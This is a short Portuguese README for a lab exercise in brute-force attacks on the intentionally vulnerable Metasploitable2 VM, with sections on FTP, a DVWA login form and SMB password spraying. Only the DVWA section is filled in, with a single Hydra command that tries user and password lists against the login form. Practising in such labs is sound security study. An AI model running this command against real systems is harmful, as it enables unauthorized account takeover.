# Brute_Force_in_Metasploitable2
Documentação de testes de força bruta utilizando Medusa e Hydra em um ambiente controlado Metasploitable2.

## Objetivo
Executar ataques simulados: força bruta em FTP, automação de tentativas de login em formulário web (DVWA) e password spraying em SMB com enumeração de usuários.

## Recursos utilizados 
- VM Kali Linux
- VM PfSense
- VM Metasploitable2

## Brute Force em FTP

## Formulário web DVWA

```
hydra -L users.txt -P pass.txt <IP_DA_METASPLOITABLE> http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
```

## Password Spraying SMB